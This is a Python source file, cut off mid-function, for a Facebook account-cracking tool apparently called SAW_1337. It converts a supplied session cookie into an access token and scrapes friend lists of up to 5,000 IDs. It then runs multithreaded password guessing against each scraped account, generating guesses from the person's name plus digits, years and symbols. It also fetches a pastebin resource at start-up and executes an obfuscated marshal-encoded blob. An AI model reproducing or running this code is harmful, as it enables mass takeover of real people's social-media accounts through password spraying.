import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from time import sleep
from rich.progress import track
pretty.install()
CON=sol()
#useragent
ugen2=['Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:51.0) Gecko/20100101 Firefox/51.0','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; Trident/6.0)','Mozilla/5.0 (X11; Linux i686 on x86_64; rv:49.0) Gecko/20100101 Firefox/49.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; rv:49.0) Gecko/20100101 Firefox/49.0','Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0','Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36','Mozilla/5.0 (X11; Linux i686 on x86_64; rv:50.0) Gecko/20100101 Firefox/50.0']
ugen=['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36']
cokbrut=[]
ses=requests.Session()
princp=[]
proxsaw = requests.get('https://pastebin.com/raw/Bq6ZCa20').text
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:48.0) Gecko/20100101 Firefox/48.0','Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:46.0) Gecko/20100101 Firefox/46.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0']
# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
# COLOUR 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m'
p = '\x1b[0;34m' 
asu = random.choice([m,k,h,u,b])
# CONVERTER
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def masud(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.004)
def clear():
	os.system('clear')
def back():
	SAWx()
import marshal
def banner():
	clear()
	k="\033[1;31m"
	s="\033[1;37m"
	print(f"""
\033[1;37m███████╗     █████╗     ██╗    ██╗
\033[1;37m██╔════╝    ██╔══██╗    ██║    ██║
\033[1;34m███████╗    ███████║    ██║ █╗ ██║ \033[1;39m0.4v
\033[1;34m╚════██║    ██╔══██║    ██║███╗██║
\033[1;31m███████║    ██║  ██║    ╚███╔███╔╝
\033[1;31m╚══════╝    ╚═╝  ╚═╝     ╚══╝╚══╝
		\033[1;37m\033[1;37m[ \033[1;37mTELEGRAM : @SAW_1337 \033[1;37m]
		\033[1;34m\033[1;37m[ \033[1;34minstagram : @127.0.2 \033[1;37m]
		\033[1;31m\033[1;37m[ \033[1;31mGroups Telegram : @SAW4x \033[1;37m]
		\033[1;37m""")
def SAWx():
 try:
  token = open('data/sawtok.txt','r').read()
  cok = open('data/sawcok.txt','r').read()
  tokenku.append(token)
  try:
   basariheker = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
   basganteng = json.loads(basariheker.text)['id']
   menu(basganteng)
  except KeyError:
   SAW()
  except requests.exceptions.ConnectionError:
   print(f'')
   exit()
 except IOError:
  SAW()
		
def SAW():
	try:
		os.system('clear')
		banner()

		cookies_SAW = input(' \033[0m [\x1b[1;96mFACEBOOK\033[0m] Cookies  : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': cookies_SAW}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" Cookies BAN", end='\r');time.sleep(3.5);print("        Cookies BAN             ", end='\r');SAW()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookies_SAW})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': cookies_SAW}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookies_SAW}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': cookies_SAW}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': cookies_SAW}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n  Tokens json : {access_token}")
							tokenew = open("data/sawtok.txt","w").write(access_token)
							cook= open("data/sawcok.txt","w").write(cookies_SAW)
							print("\n python SAW_1337.py");SAWx()
			except Exception as e:
				print(" Cookies BAN ")
				os.system('rm -rf data/sawtok.txt && rm -rf data/sawcok.txt')
				print(e)
				time.sleep(3)
				SAW()
	except:pass

def menu(my_name):
	try:
		token = open('data/sawtok.txt','r').read()
		cok = open('data/sawcok.txt','r').read()
	except IOError:
		print(' Cookies ')
		time.sleep(5)
		SAW()
	os.system('clear')
	banner()
		
	
	print("")
	print("")
	print('		\033[1;37m𝚂𝙰𝚆 \033[1;37m01 \033[1;37mCRACK PUBLIC ')
	print('		\033[1;37m𝚂𝙰𝚆 \033[1;37m02 \033[1;37mCRACK PUBLIC (ids+)')
	print('		\033[1;37m𝚂𝙰𝚆 \033[1;34m03 \033[1;34mCRACK NUMBER ')
	print('		\033[1;37m𝚂𝙰𝚆 \033[1;34m04 \033[1;34mCRACK FILE ')
	print('		\033[1;37m𝚂𝙰𝚆 \033[1;31m05 \033[1;31mMY TELEGRAM ')
	print('		\033[1;37m𝚂𝙰𝚆 \033[1;31m00 \033[1;31mEXIT ')
	print("")
	SAW = input('	\033[1;37m  CHOICE \033[1;37m : ')
	if SAW in ['1','01']:
		dump_publik()
	elif SAW in ['2','02']:
		dump_massal()
	elif SAW in ['3','03']:
		print("now not exist : الآن غير موجود ")
		exit()
	elif SAW in ['4','04']:
		SAWFILE()
	elif SAW in ['5','05']:
		os.system("xdg-open  https://t.me/SAW_1337")
		os.system("python SAW_1337.py")
	elif SAW in ['',' ']:
		os.system("python SAW_1337.py")
	elif SAW in ['666','999','99','127']:
		exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nz'xdg-open  https://instagram.com/127.0.2)\x02\xda\x02os\xda\x06system\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s'\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\n3\xd1\x004\xd4\x004\xd0\x004\xd0\x004\xd0\x004r\x06\x00\x00\x00"))
	elif SAW in ['0','00']:
		os.system('rm -rf data/sawtok.txt')
		os.system('rm -rf data/sawcok.txt')
		print(' [OK] LOGIN ACCOUNT ')
		exit()
# PUBLIC CRACK
def dump_publik():
	try:
		token = open('data/sawtok.txt','r').read()
		cok = open('data/sawcok.txt','r').read()
	except IOError:
		exit()
	win = ''
	win2 = mark(win, style='green')
	sol().print(win2)
	print("")
	pil = input(' ID FACEBOOK : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(' SAW-ID : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = ' '
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = ' NOT PUBLIC '
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()

def dump_massal():
	try:
		token = open('data/sawtok.txt','r').read()
		cok = open('data/sawcok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(' FACEBOOK IDS [25] MAX ? : '))
	except ValueError:
		print('')
		exit()
	if jum<1 or jum>100:
		print('')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' FACEBOOK ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' IDS [100] MAX ')
			exit()
		except requests.exceptions.ConnectionError:
			li = '# '
			lo = mark(li, style='yellow')
			sol().print(lo, style='purple')
			exit()
			print("\n")
	tot = ' Facebook  %s ID '%(len(id))
	if len(id)==0:
		tot2 = mark( tot, style='purple')
	else:
		tot2 = mark(tot, style='yellow')
	sol().print(tot2)
	setting()

def SAWFILE():
	try:
		token = open('data/sawtok.txt','r').read()
		cok = open('data/sawcok.txt','r').read()
	except IOError:
		exit()
	try:
		
		jum = input(' name file : ')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		print(' ID :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print(' NO CONNECTION  ')
			exit()
	except (KeyError,IOError):
			print(' is no file ')
			time.sleep(3)
			SAWx()

def setting():
	os.system('clear')
	banner()
	print("")

	if ['1','01']:
		os.system('1')
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\nSAW\n')
		exit()
	clear()
	banner()
	print("")
	method.append('mobile')
	clear()
	banner()
	print("""
	1 > password  1234 & 1122 & 12344321 & 54321
	2 > password  name
	3 > password  1980 - 2000
	4 > password  2000 - 2025
	5 > password  1234@#
	6 > password  All 
	7 > password  1234 + 1980 GOOD """)
	saw = input(' CHOICE : ')
	if saw in ['01','1']:
		passwrd1()
	if saw in ['02','2']:
		passwrd2()
	if saw in ['03','3']:
		passwrd3()
	if saw in ['04','4']:
		passwrd4()
	if saw in ['05','5']:
		passwrd5()
	if saw in ['06','6']:
		passwrd()
	if saw in ['07','7']:
		passwrd7()
	exit() 
# Method Main
def passwrd():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=50) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['123456','1122334455','224466','22446688','07500750','12345678']
			if len(frs) == 1 or len(frs) == 2 or len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'123321')
					pwv.append(frs+'1221')
					pwv.append(frs+'1980')
					pwv.append(frs+'1981')
					pwv.append(frs+'1982')
					pwv.append(frs+'1983')
					pwv.append(frs+'1984')
					pwv.append(frs+'1985')
					pwv.append(frs+'1986')
					pwv.append(frs+'1987')
					pwv.append(frs+'1988')
					pwv.append(frs+'1989')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'123443211')
					pwv.append(frs+'1234554321')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+'2000')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'112233445566')
					pwv.append(frs+'1111')
					pwv.append(frs+'2222')
					pwv.append(frs+'100200')
					pwv.append(frs+'321')
					pwv.append(frs+'4321')
					pwv.append(frs+'54321')
			else:
					pwv.append(nmf)


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s CP : %s '%(ok,cp))
	print('')
	exit()
def passwrd1():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['123456','1122334455','224466','22446688','07500750','12345678']
			if len(frs) == 1 or len(frs) == 2 or len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'123321')
					pwv.append(frs+'1221')
					pwv.append(frs+'123443211')
					pwv.append(frs+'1234554321')
					pwv.append(frs+'11223344')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'112233445566')
					pwv.append(frs+'1111')
					pwv.append(frs+'2222')
					pwv.append(frs+'100200')
					pwv.append('zaxozaxo')
					pwv.append(frs+'321')
					pwv.append(frs+'4321')
					pwv.append(frs+'54321')
					pwv.append(frs+'@#')
			else:
					pwv.append(nmf)


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s CP : %s '%(ok,cp))
	print('')
	exit()

def passwrd2():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=20) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['123456','1122334455','224466','22446688','07500750','12345678']
			if len(frs) == 1 or len(frs) == 2 or len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
			else:
					pwv.append(nmf)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s CP : %s '%(ok,cp))
	print('')
	exit()
def passwrd3():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['123456','1122334455','224466','22446688','07500750','12345678']
			if len(frs) == 1 or len(frs) == 2 or len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'1980')
					pwv.append(frs+'1981')
					pwv.append(frs+'1982')
					pwv.append(frs+'1983')
					pwv.append(frs+'1984')
					pwv.append(frs+'1985')
					pwv.append(frs+'1986')
					pwv.append(frs+'1987')
					pwv.append(frs+'1988')
					pwv.append(frs+'1989')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+'2000')
					pwv.append('1122334455')
					pwv.append('12345678910')
					pwv.append(frs+'123@#')
			else:
					pwv.append(nmf)


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s CP : %s '%(ok,cp))
	print('')
	exit()
def passwrd4():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['123456','1122334455','224466','22446688','07500750','12345678']
			if len(frs) == 1 or len(frs) == 2 or len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'2000')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
					pwv.append(frs+'2004')
					pwv.append(frs+'2005')
					pwv.append(frs+'2006')
					pwv.append(frs+'2007')
					pwv.append(frs+'2008')
					pwv.append(frs+'2009')
					pwv.append(frs+'2010')
					pwv.append(frs+'2011')
					pwv.append(frs+'2012')
					pwv.append(frs+'2013')
					pwv.append(frs+'2014')
					pwv.append(frs+'2015')
					pwv.append(frs+'2016')
					pwv.append(frs+'2017')
					pwv.append(frs+'2018')
					pwv.append(frs+'2019')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'2023')
					pwv.append(frs+'2024')
					pwv.append(frs+'2025')
			else:
					pwv.append(nmf)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s CP : %s '%(ok,cp))
	print('')
	exit()
def passwrd5():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['123456','1122334455','224466','22446688','07500750','12345678']
			if len(frs) == 1 or len(frs) == 2 or len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'12@')
					pwv.append(frs+'12@#')
					pwv.append(frs+'123@')
					pwv.append(frs+'123@#')
					pwv.append(frs+'1234@')
					pwv.append(frs+'1234@#')
					pwv.append(frs+'12345@')
					pwv.append(frs+'12345@#')
					pwv.append(frs+'123456@')
					pwv.append(frs+'123456@#')
					pwv.append(frs+'1122@')
					pwv.append(frs+'1122@#')
					pwv.append(frs+'1212@')
					pwv.append(frs+'1212@#')
					pwv.append(frs+'112233@')
					pwv.append(frs+'112233@#')
					pwv.append(frs+'11223344@')
					pwv.append(frs+'11223344@#')
					pwv.append(frs+'123321@')
					pwv.append(frs+'123321@#')
					pwv.append(frs+'12344321@')
					pwv.append(frs+'12344321@#')
					pwv.append(frs+'1234554321@')
					pwv.append(frs+'1234554321@#')
					pwv.append(frs+'54321@')
					pwv.append(frs+'54321@#')
			else:
					pwv.append(nmf)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s CP : %s '%(ok,cp))
	print('')

	exit()
def passwrd7():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=24) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['123456','1122334455','224466','22446688','07500750','12345678','10002000','100200','20004000','12345678910','200400','10002000@']
			if len(frs) == 1 or len(frs) == 2 or len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12 or len(frs) == 13 or len(frs) == 14 or len(frs) == 15 or len(frs) == 16 or len(frs) == 17 or len(frs) == 18 or len(frs) == 19 or len(frs) == 20 or len(frs) == 21 or len(frs) == 22 or len(frs) == 23 or len(frs) == 24:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1980')
					pwv.append(frs+'1981')
					pwv.append(frs+'1982')
					pwv.append(frs+'1983')
					pwv.append(frs+'1984')
					pwv.append(frs+'1985')
					pwv.append(frs+'1986')
					pwv.append(frs+'1987')
					pwv.append(frs+'1988')
					pwv.append(frs+'1989')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+'2000')
					pwv.append(frs+'1122')
					pwv.append(frs+'2222')
					pwv.append(frs+'1000')
					pwv.append(frs+'123321')
					pwv.append(frs+'112233445')
					pwv.append(frs+'11223344')
					pwv.append(frs+'4321')
					pwv.append(frs+'321')
					pwv.append(frs+'100200')
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append('123456'+frs)
					pwv.append('1234567'+frs)
					pwv.append('12345678'+frs)
					pwv.append('123456789'+frs)
					pwv.append('123321'+frs)
					pwv.append('112233445'+frs)
					pwv.append('11223344'+frs)
					pwv.append('4321'+frs)
					pwv.append('321'+frs)
					pwv.append('100200'+frs)
			else:
					pwv.append(nmf)
					pwv.append('07500750')


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
